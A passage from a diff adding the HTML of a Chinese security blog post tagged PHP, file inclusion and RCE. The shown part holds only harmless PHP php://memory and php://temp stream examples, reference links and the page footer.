+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">rewind</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">stream_get_contents</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>php://memory 和 php://temp 是一次性的，比如：stream 流关闭后，就无法再次得到以前的内容了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;php://memory&#39;</span><span class="p">,</span> <span class="s1">&#39;PHP&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://memory&#39;</span><span class="p">);</span> <span class="c1">// 啥也没有
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考文章：
+1、 <a href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#Filterchain%E6%9E%84%E9%80%A0%EF%BC%88%E5%8E%9F%E7%90%86%E9%98%90%E8%BF%B0%EF%BC%89" target="_blank" rel="noopener noreferrer">https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#Filterchain%E6%9E%84%E9%80%A0%EF%BC%88%E5%8E%9F%E7%90%86%E9%98%90%E8%BF%B0%EF%BC%89</a>
+2、 <a href="https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</a>
+3、 <a href="https://tttang.com/archive/1395/" target="_blank" rel="noopener noreferrer">https://tttang.com/archive/1395/</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-04-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/php/">PHP</a>,&nbsp;<a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>,&nbsp;<a href="/tags/rce/">RCE</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" class="prev" rel="prev" title="Open_basedir绕过"><i class="fas fa-angle-left fa-fw"></i>Open_basedir绕过</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
+</body>
+
+</html>
